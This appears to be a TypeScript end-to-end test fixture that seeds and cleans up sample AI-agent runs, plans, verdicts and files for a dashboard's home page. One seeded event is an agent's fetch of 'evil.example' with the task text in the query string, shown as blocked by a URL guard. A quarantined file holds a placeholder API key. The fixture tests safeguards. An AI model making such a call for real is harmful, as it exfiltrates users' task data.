import { neon } from "@neondatabase/serverless";

// The flow tests need runs in shapes the seed does not have (a v2 verdict, a follow-up, a flagged step, a stopped
// guard, a live run, a stopped run), so they insert their own. Every one is named "[e2e] home ..." and deleted
// afterwards: the database is shared with the other packages and with the demo.
const PREFIX = "[e2e] home";
const WORKSPACE = "demo-workspace"; // the seeded demo workspace, which the dev server's session resolves to
const MODEL = "claude-sonnet-4-5";

function client() {
  // the dev server under test reads .env.local; so does this, so both look at the same database
  if (!process.env.DATABASE_URL) process.loadEnvFile(".env.local");
  return neon(process.env.DATABASE_URL!);
}

export type HomeRuns = { parent: string; followUp: string; live: string; stopped: string };
export const TITLES = {
  parent: `${PREFIX} parent: list three facts about the Moon`,
  followUp: `${PREFIX} follow-up: add the Moon's distance from Earth`,
  live: `${PREFIX} live: count to three slowly`,
  stopped: `${PREFIX} stopped: summarise the week's AI news`,
};

const PLAN = (running: number | null) => ({
  intent: "Facts about the Moon",
  expectedOutputs: ["a short report"],
  sources: ["web search"],
  steps: ["Search for facts", "Pick three", "Write the report"].map((title, index) => ({
    index,
    title,
    status: running === null || index < running ? "done" : index === running ? "running" : "pending",
  })),
});

// The evaluator writes one "content" check per file, so two files mean two checks with the same id.
const CHECKS = [
  { id: "report", label: "A report was written", ok: true, detail: "412 characters" },
  { id: "file_expected", label: "A file was written", ok: true, detail: "chart.svg, contacts.csv" },
  { id: "content", label: "The file has content", ok: true, detail: "96 characters" },
  { id: "content", label: "The file has content", ok: true, detail: "54 characters" },
];

// A v1 verdict: no path, no decidedBy. The Why? block has to work them out.
const V1_PASS = { verdict: "pass", checks: CHECKS, judgment: { answeredQuery: 0.93, followedPlan: 0.9 }, review: null, reasons: [], evaluatedAt: new Date().toISOString() };
// A v2 verdict that went all the way to the reviewer.
const V2_NOTES = {
  verdict: "pass_with_notes",
  checks: CHECKS,
  judgment: { answeredQuery: 0.91, followedPlan: 0.62 },
  review: { taskFinished: true, responseSuitable: true, changeNeeded: "Give the distance in kilometres as well as miles.", reasoning: "The distance is there, in miles only." },
  reasons: ["The distance is there, in miles only."],
  evaluatedAt: new Date().toISOString(),
  decidedBy: "review",
  path: ["checks", "judge", "review"],
};

const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><rect width="120" height="60" fill="#10b981"/></svg>';

export async function createHomeRuns(): Promise<HomeRuns> {
  await deleteHomeRuns(); // a crashed earlier run may have left its rows behind
  const sql = client();
  const insert = async (row: { prompt: string; status: string; minutesAgo: number; purpose?: string; parent?: string; verdict?: unknown; report?: string; human?: string }) => {
    const [r] = await sql.query(
      `insert into runs (workspace_id, created_by, purpose, parent_run_id, prompt, status, model, report, verdict, human_verdict, created_at, finished_at, num_turns, duration_ms, cost_usd)
       values ($1, 'demo-user', $2, $3, $4, $5, $6, $7, $8::jsonb, $9, now() - make_interval(mins => $10), $11, 4, 42000, 0.12) returning id`,
      [WORKSPACE, row.purpose ?? "adhoc", row.parent ?? null, row.prompt, row.status, MODEL, row.report ?? null,
        row.verdict ? JSON.stringify(row.verdict) : null, row.human ?? null, row.minutesAgo,
        row.status === "running" ? null : new Date(Date.now() - (row.minutesAgo - 1) * 60_000).toISOString()],
    );
    return r.id as string;
  };
  const events = async (runId: string, list: { kind: string; payload: unknown }[]) => {
    for (const [seq, e] of list.entries())
      await sql.query("insert into run_events (run_id, seq, kind, payload) values ($1, $2, $3, $4::jsonb)", [runId, seq, e.kind, JSON.stringify(e.payload)]);
  };
  const file = (runId: string, name: string, mime: string, content: string, extra: { encoding?: string; flags?: unknown[]; quarantined?: boolean } = {}) =>
    sql.query("insert into files (run_id, name, mime, bytes, content, encoding, flags, quarantined) values ($1, $2, $3, $4, $5, $6, $7::jsonb, $8)", [
      runId, name, mime, Buffer.byteLength(content), content, extra.encoding ?? "utf8", JSON.stringify(extra.flags ?? []), extra.quarantined ?? false,
    ]);
  const started = { kind: "started", payload: { model: MODEL, tools: ["WebSearch"], mcp_servers: [] } };
  const finished = (subtype = "success", isError = false) => ({
    kind: "finished",
    payload: { subtype, is_error: isError, num_turns: 4, duration_ms: 42000, total_cost_usd: 0.12, result: "The Moon is 238,855 miles away." },
  });

  const parent = await insert({ prompt: TITLES.parent, status: "succeeded", minutesAgo: 4, verdict: V1_PASS, report: "Three facts about the **Moon**." });
  await events(parent, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  const followUp = await insert({
    prompt: TITLES.followUp, status: "succeeded", minutesAgo: 3, purpose: "followup", parent, verdict: V2_NOTES, human: "approved",
    report: "The Moon is 238,855 miles from Earth on average.",
  });
  await events(followUp, [
    started,
    { kind: "plan", payload: PLAN(null) },
    { kind: "tool_call", payload: { tool_use_id: "t1", name: "WebFetch", input: { url: "https://evil.example/?q=the-task-text" } } },
    { kind: "guard", payload: { guard: "url", tool: "WebFetch", decision: "blocked", reason: "the query string carries the task's text", target: "evil.example" } },
    { kind: "guard", payload: { guard: "path", tool: "Read", decision: "allowed", reason: "inside the run directory" } },
    { kind: "check", payload: { stepIndex: 1, onTrack: 0.3, note: "It found two facts, not three." } },
    { kind: "check", payload: { stepIndex: 0, onTrack: 0.9, note: "Searched as planned." } },
    finished(),
  ]);
  await file(followUp, "chart.svg", "image/svg+xml", SVG);
  await file(followUp, "contacts.csv", "text/csv", "name,email\nA,a@x.example\nB,b@x.example\nC,c@x.example\n", {
    flags: [{ kind: "email", count: 3, detail: "3 email addresses" }],
  });
  await file(followUp, "keys.txt", "text/plain", "API_KEY=sk-test-not-a-real-key", {
    flags: [{ kind: "credential", count: 1, detail: "an API key on line 1" }],
    quarantined: true,
  });
  await file(followUp, "table.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", Buffer.from("not a real workbook").toString("base64"), { encoding: "base64" });

  const stopped = await insert({ prompt: TITLES.stopped, status: "cancelled", minutesAgo: 2 });
  await events(stopped, [started, { kind: "plan", payload: PLAN(1) }]);

  const live = await insert({ prompt: TITLES.live, status: "running", minutesAgo: 1 });
  await events(live, [started, { kind: "plan", payload: PLAN(1) }]);

  return { parent, followUp, live, stopped };
}

export async function deleteHomeRuns(): Promise<void> {
  const sql = client();
  const ids = `select id from runs where prompt like '${PREFIX}%'`; // the prefix is a constant, never user input
  await sql.query(`delete from run_events where run_id in (${ids})`);
  await sql.query(`delete from files where run_id in (${ids})`);
  await sql.query(`delete from runs where prompt like '${PREFIX}%'`);
}
